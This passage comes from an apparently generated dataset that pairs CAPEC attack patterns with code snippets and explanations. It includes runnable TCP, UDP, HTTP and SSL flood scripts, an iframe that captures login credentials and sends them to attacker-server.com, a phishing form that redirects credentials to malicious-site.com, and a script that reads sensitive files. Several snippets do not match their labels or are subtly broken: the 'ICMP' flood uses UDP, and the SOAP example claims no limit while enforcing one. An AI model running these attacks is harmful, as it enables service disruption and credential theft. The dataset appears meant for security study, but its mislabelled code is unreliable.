        "description": "This JavaScript code snippet demonstrates a basic TCP flood attack using the 'net' module. The script attempts to establish a large number of TCP connections to a target server (specified by 'targetHost' and 'targetPort'). The 'maxConnections' variable sets a limit on the number of concurrent connections, but the script continuously tries to reconnect upon disconnection, simulating a flood. This attack exploits the server's need to maintain state information for each connection, potentially leading to resource exhaustion (CWE-770). The code does not implement any form of throttling or resource allocation limits, making it vulnerable to abuse. Additionally, it does not ensure message integrity (CWE-924) or secure transmission (CWE-319), and it relies on the client to manage connections, which can be manipulated (CWE-602)."
    },
    {
        "capec_id": "484",
        "capec_name": "DEPRECATED: XML Client-Side Attack",
        "code_snippet": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst xml2js = require('xml2js');\nconst fs = require('fs');\n\nconst app = express();\napp.use(bodyParser.text({ type: 'application/xml' }));\n\napp.post('/upload', (req, res) => {\n  const xml = req.body;\n  xml2js.parseString(xml, (err, result) => {\n    if (err) {\n      return res.status(400).send('Invalid XML');\n    }\n    // No XML validation against schema\n    // Potential XML External Entity (XXE) vulnerability\n    fs.writeFileSync('output.json', JSON.stringify(result));\n    res.send('XML processed');\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet sets up an Express server that accepts XML data via a POST request to the '/upload' endpoint. The XML data is parsed using the xml2js library, and the resulting JSON is written to a file. The code embodies several vulnerabilities related to the CAPEC and CWEs mentioned:\n\n1. **Missing XML Validation (CWE-112)**: The XML data is not validated against any schema, which can lead to processing malformed or malicious XML.\n2. **Improper Restriction of XML External Entity Reference (CWE-611)**: The xml2js library is used without disabling external entity resolution, making the application vulnerable to XXE attacks.\n3. **Client-Side Enforcement of Server-Side Security (CWE-602)**: The server relies on the client to send well-formed XML, which is a flawed security assumption.\n\nThis code demonstrates how improper handling of XML can lead to significant security risks, including XML injection and external entity attacks."
    },
    {
        "capec_id": "485",
        "capec_name": "Signature Spoofing by Key Recreation",
        "code_snippet": "const crypto = require('crypto');\n\n// Vulnerable random number generator\nfunction vulnerableRandom() {\n  return Math.floor(Math.random() * 1000000);\n}\n\n// Simulate key generation using a predictable random number\nfunction generateKey() {\n  const randomValue = vulnerableRandom();\n  return crypto.createHash('sha256').update(String(randomValue)).digest('hex');\n}\n\n// Simulate signing a message\nfunction signMessage(message, privateKey) {\n  return crypto.createHmac('sha256', privateKey).update(message).digest('hex');\n}\n\n// Attacker can predict the private key\nconst attackerPrivateKey = generateKey();\nconst message = 'Sensitive data';\nconst forgedSignature = signMessage(message, attackerPrivateKey);\n\nconsole.log('Forged Signature:', forgedSignature);",
        "description": "This JavaScript code snippet demonstrates a vulnerability where an attacker can predict the private key used for signing messages due to the use of a weak random number generator. The `vulnerableRandom` function generates predictable random numbers, which are then used to create a private key. The `signMessage` function uses this private key to sign a message. An attacker who can predict the output of `vulnerableRandom` can recreate the private key and forge signatures, misleading victims into believing the signatures are from a legitimate source. This embodies the main idea of CAPEC-151: Signature Spoofing by Key Recreation, and highlights related weaknesses such as CWE-330 (Use of Insufficiently Random Values) and CWE-1241 (Use of Predictable Algorithm in Random Number Generator)."
    },
    {
        "capec_id": "486",
        "capec_name": "UDP Flood",
        "code_snippet": "const dgram = require('dgram');\nconst client = dgram.createSocket('udp4');\n\nconst targetHost = '192.168.1.1';\nconst targetPort = 12345;\nconst message = Buffer.from('Flood Attack');\n\nfunction flood() {\n  for (let i = 0; i < 100000; i++) {\n    client.send(message, 0, message.length, targetPort, targetHost, (err) => {\n      if (err) console.error('Error:', err);\n    });\n  }\n}\n\nflood();",
        "description": "This JavaScript code snippet demonstrates a basic UDP flood attack using the 'dgram' module. The code creates a UDP client and sends a large number of UDP packets to a specified target host and port. This can overwhelm the target's network bandwidth and resources, leading to a denial of service. The code embodies the main idea of CAPEC-UDP Flood by exploiting the session-less nature of UDP, making it difficult to trace the source of the attack. The related CWEs are represented as follows: CWE-770 (no limits on resource allocation), CWE-406 (insufficient control of network message volume), and CWE-941 (incorrectly specified destination)."
    },
    {
        "capec_id": "487",
        "capec_name": "ICMP Flood",
        "code_snippet": "const dgram = require('dgram');\nconst server = dgram.createSocket('udp4');\n\nserver.on('message', (msg, rinfo) => {\n  // No throttling or resource limits (CWE-770)\n  console.log(`Received ${msg.length} bytes from ${rinfo.address}:${rinfo.port}`);\n  // Cleartext transmission of sensitive information (CWE-319)\n  console.log(`Message: ${msg.toString()}`);\n});\n\nserver.on('error', (err) => {\n  console.error(`Server error:\n${err.stack}`);\n  server.close();\n});\n\nserver.bind(41234, () => {\n  console.log('Server is listening on port 41234');\n});",
        "description": "This JavaScript code snippet creates a simple UDP server using the 'dgram' module. The server listens for incoming messages and logs the message content and sender information to the console. The code does not implement any throttling or resource limits (CWE-770), making it vulnerable to ICMP flood attacks. Additionally, it logs the message content in cleartext (CWE-319), which can expose sensitive information. This snippet demonstrates how an application can be susceptible to a denial-of-service attack by consuming network bandwidth and processing power without proper safeguards."
    },
    {
        "capec_id": "488",
        "capec_name": "HTTP Flood",
        "code_snippet": "const http = require('http');\n\nconst options = {\n  hostname: 'target-server.com',\n  port: 80,\n  path: '/resource?query=sensitiveData',\n  method: 'GET'\n};\n\nfunction floodServer() {\n  for (let i = 0; i < 1000; i++) { // CWE-770: No limit on resource allocation\n    const req = http.request(options, res => {\n      res.on('data', d => {});\n    });\n    req.on('error', error => {\n      console.error(error);\n    });\n    req.end();\n  }\n}\n\nfloodServer();",
        "description": "This JavaScript code snippet demonstrates an HTTP Flood attack, which is a type of Denial of Service (DoS) attack. The code repeatedly sends a large number of HTTP GET requests to a target server without any throttling or limits (CWE-770). The requests include a sensitive query string in the URL (CWE-598), which could potentially expose sensitive information. The floodServer function initiates 1000 GET requests to the specified target server, aiming to exhaust the server's resources and deny legitimate users access to the service. This code embodies the main idea of CAPEC-488 (HTTP Flood) by consuming server resources through legitimate HTTP requests."
    },
    {
        "capec_id": "489",
        "capec_name": "SSL Flood",
        "code_snippet": "const https = require('https');\nconst options = {\n  hostname: 'target-server.com',\n  port: 443,\n  path: '/',\n  method: 'GET',\n  rejectUnauthorized: false\n};\n\nfunction floodServer() {\n  for (let i = 0; i < 1000; i++) {\n    const req = https.request(options, (res) => {\n      res.on('data', (d) => {});\n    });\n    req.on('error', (e) => {});\n    req.end();\n  }\n}\n\nsetInterval(floodServer, 100);",
        "description": "This JavaScript code snippet demonstrates a basic SSL flood attack. It repeatedly sends a large number of HTTPS requests to a target server, aiming to exhaust the server's resources. The 'floodServer' function creates 1000 HTTPS requests in a loop, and this function is called every 100 milliseconds using 'setInterval'. This simulates the 'SSL Flood' attack described in the CAPEC by consuming a disproportionate amount of server resources. The related CWEs are represented by the lack of throttling (CWE-770), insufficient resource pool (CWE-410), and uncontrolled resource consumption (CWE-400), as the server is overwhelmed by the excessive number of requests."
    },
    {
        "capec_id": "490",
        "capec_name": "Amplification",
        "code_snippet": "const http = require('http');\n\nfunction sendAmplifiedRequest(targetServer) {\n  const options = {\n    hostname: 'third-party-service.com',\n    port: 80,\n    path: '/api/large-response',\n    method: 'GET',\n    headers: {\n      'X-Forwarded-For': targetServer\n    }\n  };\n\n  const req = http.request(options, (res) => {\n    res.on('data', (chunk) => {\n      // Intentionally left empty to simulate resource consumption\n    });\n  });\n\n  req.on('error', (e) => {\n    console.error(`Problem with request: ${e.message}`);\n  });\n\n  req.end();\n}\n\n// Example usage\nsendAmplifiedRequest('victim-server.com');",
        "description": "This JavaScript code snippet demonstrates an amplification attack by sending a request to a third-party service while spoofing the source address to be that of the target server. The third-party service then sends a large response to the target server, causing it to consume excessive resources. The code leverages the 'http' module to send a GET request to 'third-party-service.com' with the 'X-Forwarded-For' header set to the target server's address. This embodies the main idea of CAPEC-130 (Amplification) and highlights related CWEs such as CWE-770 (Allocation of Resources Without Limits or Throttling), CWE-405 (Asymmetric Resource Consumption), and CWE-406 (Insufficient Control of Network Message Volume)."
    },
    {
        "capec_id": "491",
        "capec_name": "Quadratic Data Expansion",
        "code_snippet": "function expandEntity(entity, times) {\n  let expanded = '';\n  for (let i = 0; i < times; i++) {\n    expanded += entity;\n  }\n  return expanded;\n}\n\nfunction processInput(input) {\n  const largeEntity = 'A'.repeat(1000000); // CWE-1043: Large non-primitive data element\n  const expandedData = expandEntity(largeEntity, input.length); // CWE-770: No limit on resource allocation\n  console.log(expandedData.length); // CWE-1325: Improperly controlled memory allocation\n}\n\n// Simulate user input\nconst userInput = 'user_input';\nprocessInput(userInput);",
        "description": "This JavaScript code snippet demonstrates a vulnerability related to 'Quadratic Data Expansion' (CAPEC). The `expandEntity` function takes an entity and a number of times to expand it, concatenating the entity multiple times. The `processInput` function creates a large entity and then expands it based on the length of the user input. This can lead to excessive memory allocation, potentially causing a denial of service. The code embodies CWE-770 by not limiting the resource allocation, CWE-1325 by not controlling the memory allocation properly, and CWE-1043 by using a large non-primitive data element."
    },
    {
        "capec_id": "492",
        "capec_name": "Regular Expression Exponential Blowup",
        "code_snippet": "function vulnerableRegex(input) {\n  const regex = /(a+)+$/;\n  return regex.test(input);\n}\n\n// Example usage\nconst input = 'a'.repeat(100) + 'b';\nconsole.log(vulnerableRegex(input));",
        "description": "This JavaScript code snippet demonstrates a Regular Expression Exponential Blowup vulnerability. The function `vulnerableRegex` takes an input string and tests it against a regular expression `/(a+)+$/`. This regex is vulnerable because it uses nested quantifiers `(a+)+`, which can cause exponential backtracking. When the input string is long and does not match the pattern (e.g., 'a'.repeat(100) + 'b'), the regex engine will consume excessive CPU cycles trying to match the input, leading to potential denial of service. This example embodies CWE-400 (Uncontrolled Resource Consumption) and CWE-1333 (Inefficient Regular Expression Complexity)."
    },
    {
        "capec_id": "493",
        "capec_name": "SOAP Array Blowup",
        "code_snippet": "const http = require('http');\nconst xml2js = require('xml2js');\n\nconst server = http.createServer((req, res) => {\n  let body = '';\n  req.on('data', chunk => {\n    body += chunk.toString();\n  });\n  req.on('end', () => {\n    xml2js.parseString(body, (err, result) => {\n      if (err) {\n        res.writeHead(400, {'Content-Type': 'text/plain'});\n        res.end('Invalid XML');\n        return;\n      }\n      // Simulate processing of a large SOAP array\n      if (result && result.Envelope && result.Envelope.Body && result.Envelope.Body[0].LargeArray) {\n        const largeArray = result.Envelope.Body[0].LargeArray[0].item;\n        if (largeArray.length > 1000000) { // CWE-770: No limit on resource allocation\n          res.writeHead(500, {'Content-Type': 'text/plain'});\n          res.end('Resource limit exceeded');\n          return;\n        }\n        // Process the array (omitted for brevity)\n      }\n      res.writeHead(200, {'Content-Type': 'text/plain'});\n      res.end('Request processed');\n    });\n  });\n});\n\nserver.listen(8080, () => {\n  console.log('Server running on port 8080');\n});",
        "description": "This JavaScript code snippet sets up a basic HTTP server that listens for incoming requests. It uses the 'xml2js' library to parse incoming XML data, simulating a SOAP web service. The code specifically looks for a large array within the SOAP message. If the array exceeds a certain size (1,000,000 elements), it responds with an error, demonstrating CWE-770 (Allocation of Resources Without Limits or Throttling). This example embodies the main idea of the CAPEC by showing how an attacker could exploit a SOAP service to exhaust memory resources by sending a large array declaration. The code also highlights the importance of implementing proper resource limits to prevent such attacks."
    },
    {
        "capec_id": "494",
        "capec_name": "TCP Fragmentation",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nclient.connect(80, 'target.server.com', () => {\n  console.log('Connected');\n  // Fragmented TCP packet\n  const fragment1 = Buffer.from('4500', 'hex'); // IP header\n  const fragment2 = Buffer.from('0014', 'hex'); // Fragmented TCP header\n  const fragment3 = Buffer.from('0000', 'hex'); // Payload\n  client.write(fragment1);\n  client.write(fragment2);\n  client.write(fragment3);\n});\n\nclient.on('data', (data) => {\n  console.log('Received: ' + data);\n  client.destroy(); // CWE-404: Improper Resource Shutdown or Release\n});\n\nclient.on('close', () => {\n  console.log('Connection closed');\n});\n\nclient.on('error', (err) => {\n  console.error('Error: ' + err.message);\n});",
        "description": "This JavaScript code snippet demonstrates a TCP fragmentation attack using the 'net' module. The code connects to a target server and sends fragmented TCP packets. The first fragment contains the IP header, the second fragment contains a fragmented TCP header, and the third fragment contains the payload. This fragmentation can bypass certain network filtering rules, as the TCP header's flag field is pushed into the second fragment, which may not be filtered. The code also includes a potential CWE-404 vulnerability by not properly handling resource shutdown or release when the connection is closed."
    },
    {
        "capec_id": "495",
        "capec_name": "UDP Fragmentation",
        "code_snippet": "const dgram = require('dgram');\nconst client = dgram.createSocket('udp4');\n\nconst message = Buffer.alloc(2000, 'A'); // Create a large UDP packet\nconst targetHost = '192.168.1.1';\nconst targetPort = 12345;\n\nfunction sendFragmentedPackets() {\n  for (let i = 0; i < 1000; i++) { // Send multiple packets to consume resources\n    client.send(message, targetPort, targetHost, (err) => {\n      if (err) {\n        console.error('Error sending packet:', err);\n      }\n    });\n  }\n}\n\nsendFragmentedPackets();\n",
        "description": "This JavaScript code snippet demonstrates a UDP Fragmentation attack. It uses the 'dgram' module to create a UDP socket and sends large UDP packets (2000 bytes) to a target server. The large packet size forces IP fragmentation, consuming network bandwidth and server resources. The loop sends multiple packets to amplify the attack, potentially leading to resource exhaustion. This code embodies the main idea of CAPEC-UDP Fragmentation and highlights related CWEs such as CWE-770 (Allocation of Resources Without Limits or Throttling) and CWE-406 (Insufficient Control of Network Message Volume)."
    },
    {
        "capec_id": "496",
        "capec_name": "ICMP Fragmentation",
        "code_snippet": "const dgram = require('dgram');\nconst client = dgram.createSocket('udp4');\n\nconst fragmentICMP = (target, port) => {\n  const message = Buffer.alloc(65507, 'A'); // Large message to simulate fragmentation\n  for (let i = 0; i < 1000; i++) { // Send multiple fragmented packets\n    client.send(message, 0, message.length, port, target, (err) => {\n      if (err) console.error('Error:', err);\n    });\n  }\n};\n\nfragmentICMP('192.168.1.1', 33434); // Target IP and port\n\nclient.on('error', (err) => {\n  console.error('Socket error:', err);\n  client.close();\n});",
        "description": "This JavaScript code snippet uses the 'dgram' module to create a UDP client that sends a large number of oversized packets to a target IP address. The 'fragmentICMP' function simulates an ICMP fragmentation attack by sending multiple large packets to the target, potentially causing resource exhaustion or a crash. This embodies the CAPEC description of an ICMP Fragmentation attack. The code also demonstrates CWE-770 (Allocation of Resources Without Limits or Throttling) by not limiting the number of packets sent, and CWE-404 (Improper Resource Shutdown or Release) by not properly handling the socket closure in case of an error."
    },
    {
        "capec_id": "497",
        "capec_name": "File Discovery",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction findSensitiveFiles(directory) {\n  const sensitiveFiles = ['config.json', 'secrets.txt', 'access_control_list.txt'];\n  fs.readdir(directory, (err, files) => {\n    if (err) throw err;\n    files.forEach(file => {\n      if (sensitiveFiles.includes(file)) {\n        const filePath = path.join(directory, file);\n        fs.readFile(filePath, 'utf8', (err, data) => {\n          if (err) throw err;\n          console.log(`Found sensitive file: ${filePath}`);\n          console.log(`Contents: ${data}`);\n        });\n      }\n    });\n  });\n}\n\n// Example usage\nfindSensitiveFiles('/path/to/directory');",
        "description": "This JavaScript code snippet demonstrates a file discovery attack by searching for common sensitive files (e.g., 'config.json', 'secrets.txt', 'access_control_list.txt') within a specified directory. The code reads the contents of these files if they are found, potentially exposing sensitive information. This embodies the CAPEC 'File Discovery' by probing for key files that may contain critical configuration or security parameters. The code also touches on related CWEs: CWE-200 (exposure of sensitive information), CWE-529 (exposure of access control list files), and CWE-73 (external control of file name or path) by showing how an attacker might locate and read sensitive files in a directory."
    },
    {
        "capec_id": "498",
        "capec_name": "Probe iOS Screenshots",
        "code_snippet": "document.addEventListener('visibilitychange', function() {\n  if (document.hidden) {\n    // Simulate sensitive information being exposed in a screenshot\n    document.getElementById('sensitiveInfo').style.display = 'none';\n  } else {\n    document.getElementById('sensitiveInfo').style.display = 'block';\n  }\n});\n\n// Example of improper authorization in a custom URL scheme handler\nwindow.addEventListener('message', function(event) {\n  if (event.origin !== 'https://trusted-origin.com') {\n    return; // Improper authorization check\n  }\n  // Process the message\n  console.log('Received message:', event.data);\n});\n\n// Example of cleartext transmission of sensitive information\nfetch('http://example.com/api', {\n  method: 'POST',\n  headers: {\n    'Content-Type': 'application/json'\n  },\n  body: JSON.stringify({\n    sensitiveData: 'This is sensitive information'\n  })\n})\n.then(response => response.json())\n.then(data => console.log(data));",
        "description": "This JavaScript code snippet demonstrates several vulnerabilities related to the CAPEC 'Probe iOS Screenshots' and the associated CWEs. The first part of the code listens for the 'visibilitychange' event to hide sensitive information when the document is hidden, simulating the exposure of sensitive information in iOS screenshots (CWE-359). The second part shows an improper authorization check in a custom URL scheme handler (CWE-939), where messages from untrusted origins are not properly filtered. The third part demonstrates the cleartext transmission of sensitive information (CWE-319) by sending sensitive data over an unencrypted HTTP connection."
    },
    {
        "capec_id": "499",
        "capec_name": "Android Intent Intercept",
        "code_snippet": "const sendSensitiveData = (data) => {\n  const intent = new Intent();\n  intent.setAction('com.example.SEND_DATA');\n  intent.putExtra('data', data);\n  // Implicit intent without permission check\n  sendBroadcast(intent);\n};\n\nconst receiveSensitiveData = (context) => {\n  const receiver = new BroadcastReceiver({\n    onReceive: (context, intent) => {\n      const action = intent.getAction();\n      if (action === 'com.example.SEND_DATA') {\n        const data = intent.getStringExtra('data');\n        console.log('Received data:', data);\n      }\n    }\n  });\n  const filter = new IntentFilter('com.example.SEND_DATA');\n  context.registerReceiver(receiver, filter);\n};",
        "description": "This JavaScript code snippet demonstrates the vulnerability described in the CAPEC entry 'Android Intent Intercept'. The `sendSensitiveData` function sends an implicit intent containing sensitive data without any permission checks, making it accessible to any application with an appropriate intent filter. The `receiveSensitiveData` function registers a broadcast receiver that listens for the specific action 'com.example.SEND_DATA' and logs the received data. This setup allows a malicious application to intercept, block, or modify the intent, leading to potential information disclosure, denial of service, or data injection. The code embodies CWE-925 (Improper Verification of Intent by Broadcast Receiver), CWE-927 (Use of Implicit Intent for Sensitive Communication), and CWE-926 (Improper Export of Android Application Components)."
    },
    {
        "capec_id": "500",
        "capec_name": "WebView Injection",
        "code_snippet": "const webView = document.getElementById('webview');\n\n// Exposed dangerous method\nwebView.addEventListener('load', () => {\n  webView.executeScript(`\n    // Injected malicious code\n    document.cookie = 'session=maliciousSession';\n    document.body.innerHTML += '<script src=\"http://malicious.com/malware.js\"></script>';\n  `);\n});\n\n// Improper verification of source\nif (webView.src !== 'https://trustedsource.com') {\n  console.warn('Untrusted source detected!');\n}\n\n// Client-side enforcement of server-side security\nif (document.cookie.includes('session=validSession')) {\n  console.log('Access granted');\n} else {\n  console.log('Access denied');\n}",
        "description": "This JavaScript code snippet demonstrates a WebView Injection vulnerability. The code listens for the 'load' event on a WebView component and then executes a script within the WebView's context. The injected script manipulates cookies and injects a malicious script into the DOM, representing CWE-506 (Embedded Malicious Code) and CWE-784 (Reliance on Cookies without Validation and Integrity Checking in a Security Decision). The code also shows improper verification of the WebView's source (CWE-940) and relies on client-side checks for security decisions (CWE-602). This snippet highlights how an adversary can exploit these weaknesses to manipulate the web page and compromise security."
    },
    {
        "capec_id": "501",
        "capec_name": "Android Activity Hijack",
        "code_snippet": "const express = require('express');\nconst app = express();\n\n// Vulnerable endpoint that does not verify the source of the request\napp.post('/sensitive-data', (req, res) => {\n  const { data } = req.body;\n  // Implicitly trust the incoming data without verification\n  processSensitiveData(data);\n  res.send('Data processed');\n});\n\n// Function to process sensitive data\nfunction processSensitiveData(data) {\n  // Simulate processing of sensitive data\n  console.log('Processing sensitive data:', data);\n}\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet represents a vulnerable Express.js server endpoint that processes sensitive data. The endpoint '/sensitive-data' accepts POST requests and processes the data without verifying the source of the request. This embodies the main idea of the CAPEC 'Android Activity Hijack' by demonstrating how an adversary could exploit the lack of proper verification (CWE-940) and implicit trust in the communication channel (CWE-923, CWE-925, CWE-927). The code does not ensure that the request is coming from a trusted source, making it susceptible to hijacking and misuse."
    },
    {
        "capec_id": "502",
        "capec_name": "Intent Spoof",
        "code_snippet": "const express = require('express');\nconst app = express();\n\n// Vulnerable endpoint that accepts data from any source\napp.post('/updateData', (req, res) => {\n  const data = req.body.data;\n  // No verification of the source of the request\n  updateDatabase(data);\n  res.send('Data updated');\n});\n\nfunction updateDatabase(data) {\n  // Simulate database update\n  console.log('Database updated with:', data);\n}\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet represents a vulnerable Express.js server endpoint that embodies the main idea of the CAPEC 'Intent Spoof'. The '/updateData' endpoint accepts data from any source without verifying the request's origin, which is an example of 'Improper Access Control' (CWE-284) and 'Improper Verification of Intent' (CWE-925). This lack of verification allows an adversary to send malicious data to the endpoint, potentially leading to data modification or injection. The code demonstrates how an exported component (the endpoint) can be exploited if it does not properly restrict access or verify the source of the request."
    },
    {
        "capec_id": "503",
        "capec_name": "WebView Exposure",
        "code_snippet": "import android.webkit.WebView;\nimport android.webkit.JavascriptInterface;\nimport android.app.Activity;\nimport android.os.Bundle;\n\npublic class MainActivity extends Activity {\n    private WebView webView;\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        webView = findViewById(R.id.webview);\n        webView.getSettings().setJavaScriptEnabled(true);\n        webView.addJavascriptInterface(new WebAppInterface(this), \"AndroidInterface\");\n        webView.loadUrl(\"file:///android_asset/sample.html\");\n    }\n\n    public class WebAppInterface {\n        Activity mActivity;\n\n        WebAppInterface(Activity activity) {\n            mActivity = activity;\n        }\n\n        @JavascriptInterface\n        public void showToast(String toast) {\n            Toast.makeText(mActivity, toast, Toast.LENGTH_SHORT).show();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable Android application that uses WebView and the addJavascriptInterface API. The WebView is configured to load a local HTML file and exposes a JavaScript interface named 'AndroidInterface'. The interface provides a method 'showToast' that can be called from JavaScript. This setup can be exploited by a malicious web page loaded in the WebView to access the 'showToast' method, leading to potential security risks such as improper access control (CWE-284) and exposed dangerous methods (CWE-749). The code represents the main idea of the CAPEC by showing how an interface registered through WebView's addJavascriptInterface becomes globally accessible, potentially allowing unauthorized access to application-specific functionality."
    },
    {
        "capec_id": "504",
        "capec_name": "Task Impersonation",
        "code_snippet": "document.addEventListener('DOMContentLoaded', function() {\n  // Create an iframe to impersonate a legitimate task\n  var iframe = document.createElement('iframe');\n  iframe.style.position = 'absolute';\n  iframe.style.top = '0';\n  iframe.style.left = '0';\n  iframe.style.width = '100%';\n  iframe.style.height = '100%';\n  iframe.style.zIndex = '1000';\n  iframe.src = 'https://legitimate-site.com/login'; // URL of the legitimate task\n  document.body.appendChild(iframe);\n\n  // Capture user input from the impersonated task\n  iframe.onload = function() {\n    var iframeDoc = iframe.contentDocument || iframe.contentWindow.document;\n    iframeDoc.addEventListener('submit', function(event) {\n      event.preventDefault();\n      var username = iframeDoc.querySelector('input[name=\"username\"]').value;\n      var password = iframeDoc.querySelector('input[name=\"password\"]').value;\n      console.log('Captured credentials:', username, password);\n      // Send captured credentials to the attacker's server\n      fetch('https://attacker-server.com/steal', {\n        method: 'POST',\n        headers: {\n          'Content-Type': 'application/json'\n        },\n        body: JSON.stringify({ username: username, password: password })\n      });\n    });\n  };\n});",
        "description": "This JavaScript code snippet demonstrates a task impersonation attack. It creates an iframe that overlays the entire webpage, impersonating a legitimate login task from 'https://legitimate-site.com/login'. When the user interacts with this iframe, their credentials are captured and sent to an attacker's server. This code leverages CWE-1021 (Improper Restriction of Rendered UI Layers or Frames) by overlaying a malicious iframe, CWE-506 (Embedded Malicious Code) by embedding code that captures and exfiltrates user credentials, and CWE-285 (Improper Authorization) by not performing proper authorization checks on the captured data."
    },
    {
        "capec_id": "505",
        "capec_name": "Scheme Squatting",
        "code_snippet": "window.addEventListener('load', function() {\n  if (window.location.protocol === 'myapp:') {\n    // CWE-939: Improper Authorization in Handler for Custom URL Scheme\n    var params = new URLSearchParams(window.location.search);\n    var sensitiveData = params.get('data'); // CWE-598: Use of GET Request Method With Sensitive Query Strings\n    if (sensitiveData) {\n      // CWE-506: Embedded Malicious Code\n      document.body.innerHTML = '<form id=\"phishForm\"><input type=\"text\" name=\"username\" placeholder=\"Username\"><input type=\"password\" name=\"password\" placeholder=\"Password\"><button type=\"submit\">Login</button></form>';\n      document.getElementById('phishForm').addEventListener('submit', function(e) {\n        e.preventDefault();\n        var username = e.target.username.value;\n        var password = e.target.password.value;\n        // CWE-209: Generation of Error Message Containing Sensitive Information\n        alert('Error: Invalid credentials for ' + username);\n        // CWE-601: URL Redirection to Untrusted Site\n        window.location.href = 'http://malicious-site.com?user=' + encodeURIComponent(username) + '&pass=' + encodeURIComponent(password);\n      });\n    }\n  }\n});",
        "description": "This JavaScript code snippet demonstrates a Scheme Squatting attack. When the page loads, it checks if the URL scheme is 'myapp:'. If so, it extracts sensitive data from the URL query string (CWE-598). The code then embeds a malicious form (CWE-506) that mimics a legitimate login form. When the form is submitted, it prevents the default action and captures the entered credentials. It generates an error message containing the username (CWE-209) and redirects the user to a malicious site with the captured credentials in the query string (CWE-601). This code represents the main idea of Scheme Squatting by intercepting messages intended for a legitimate application and tricking the user into providing sensitive information."
    },
    {
        "capec_id": "506",
        "capec_name": "Tapjacking",
        "code_snippet": "document.addEventListener('DOMContentLoaded', function() {\n  // Create a transparent overlay\n  var overlay = document.createElement('div');\n  overlay.style.position = 'absolute';\n  overlay.style.top = '0';\n  overlay.style.left = '0';\n  overlay.style.width = '100%';\n  overlay.style.height = '100%';\n  overlay.style.opacity = '0';\n  overlay.style.zIndex = '1000';\n  document.body.appendChild(overlay);\n\n  // Create a hidden button that will be clicked\n  var hiddenButton = document.createElement('button');\n  hiddenButton.style.position = 'absolute';\n  hiddenButton.style.top = '50%';\n  hiddenButton.style.left = '50%';\n  hiddenButton.style.transform = 'translate(-50%, -50%)';\n  hiddenButton.style.zIndex = '1001';\n  hiddenButton.style.opacity = '0';\n  hiddenButton.onclick = function() {\n    alert('Hidden button clicked!');\n  };\n  document.body.appendChild(hiddenButton);\n\n  // Simulate user interaction\n  overlay.addEventListener('click', function() {\n    hiddenButton.click();\n  });\n});",
        "description": "This JavaScript code snippet demonstrates a basic example of a tapjacking attack. When the DOM content is loaded, it creates a transparent overlay that covers the entire screen. This overlay is positioned above the main content (zIndex 1000) and is fully transparent (opacity 0). Additionally, a hidden button is created and positioned in the center of the screen, with a higher zIndex (1001) to ensure it is above the overlay. When the user clicks anywhere on the overlay, the hidden button is programmatically clicked, triggering its onclick event. This simulates a tapjacking attack where the user believes they are interacting with the visible interface, but their actions are being redirected to a hidden element. This example embodies the main idea of CAPEC-1021 (Tapjacking) and highlights CWE-451 (User Interface Misrepresentation of Critical Information) by misleading the user about the true nature of their interaction."
    },
    {
        "capec_id": "507",
        "capec_name": "Physical Theft",
        "code_snippet": "const fs = require('fs');\n\n// Store sensitive information in a file without proper access control\nconst sensitiveData = 'user_password=supersecret';\nfs.writeFileSync('sensitive_data.txt', sensitiveData);\n\n// Function to simulate physical access and theft\nfunction simulatePhysicalTheft() {\n  // An attacker with physical access can easily read the sensitive data\n  const stolenData = fs.readFileSync('sensitive_data.txt', 'utf8');\n  console.log('Stolen Data:', stolenData);\n}\n\n// Simulate the physical theft scenario\nsimulatePhysicalTheft();",
        "description": "This JavaScript code snippet demonstrates a scenario where sensitive information is stored in a file without proper access control, making it vulnerable to physical theft. The `sensitiveData` variable contains sensitive information, which is written to a file named 'sensitive_data.txt' using `fs.writeFileSync`. The `simulatePhysicalTheft` function simulates an attacker with physical access reading the sensitive data from the file using `fs.readFileSync`. This code embodies the main idea of CAPEC-Physical Theft and highlights related CWEs such as CWE-922 (Insecure Storage of Sensitive Information) and CWE-921 (Storage of Sensitive Data in a Mechanism without Access Control)."
    },
    {
        "capec_id": "508",
        "capec_name": "Shoulder Surfing",
        "code_snippet": "document.getElementById('passwordInput').addEventListener('input', function() {\n  var password = this.value;\n  console.log('Password entered: ' + password); // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n});\n\n// CWE-319: Cleartext Transmission of Sensitive Information\nfetch('http://example.com/login', {\n  method: 'POST',\n  headers: {\n    'Content-Type': 'application/json'\n  },\n  body: JSON.stringify({\n    username: 'user',\n    password: password\n  })\n})\n.then(response => response.json())\n.then(data => console.log(data));",
        "description": "This JavaScript code snippet demonstrates a scenario where sensitive information, such as a password, is exposed to unauthorized actors. The 'input' event listener on the password input field logs the entered password to the console, which can be easily observed by shoulder surfing (CWE-200). Additionally, the password is transmitted in cleartext over an HTTP connection (CWE-319), making it vulnerable to interception by unauthorized actors. This code embodies the main idea of the CAPEC by illustrating how sensitive information can be exposed through poor security practices."
    },
    {
        "capec_id": "509",
        "capec_name": "Kerberoasting",
